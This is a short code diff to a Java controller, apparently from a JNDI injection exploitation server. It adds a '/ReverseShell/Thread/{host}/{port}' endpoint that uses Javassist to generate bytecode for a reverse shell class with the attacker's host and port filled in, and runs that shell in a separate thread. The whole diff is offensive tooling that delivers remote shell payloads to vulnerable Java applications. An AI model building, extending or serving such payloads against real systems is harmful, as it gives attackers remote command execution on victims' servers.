@@ -99,6 +99,23 @@ public class BasicController implements Controller {
 
         ReflectUtil.setCtField(clazz, "host", CtField.Initializer.constant(host));
         ReflectUtil.setCtField(clazz, "port", CtField.Initializer.constant(Integer.parseInt(port)));
+        ReflectUtil.setCtField(clazz, "thread", CtField.Initializer.constant(false));
+
+        return clazz.toBytecode();
+    }
+
+    @JNDIMapping("/ReverseShell/Thread/{host}/{port}")
+    public byte[] reverseShellThread(String host, String port) throws Exception {
+        System.out.println("[ReverseShell] [Thread] Host: " + host + " Port: " + port);
+
+        String className = MiscUtil.getClassName();
+        ClassPool pool = ClassPool.getDefault();
+        CtClass clazz = pool.get(ReverseShell.class.getName());
+        clazz.replaceClassName(clazz.getName(), className);
+
+        ReflectUtil.setCtField(clazz, "host", CtField.Initializer.constant(host));
+        ReflectUtil.setCtField(clazz, "port", CtField.Initializer.constant(Integer.parseInt(port)));
+        ReflectUtil.setCtField(clazz, "thread", CtField.Initializer.constant(true));
 
         return clazz.toBytecode();
     }
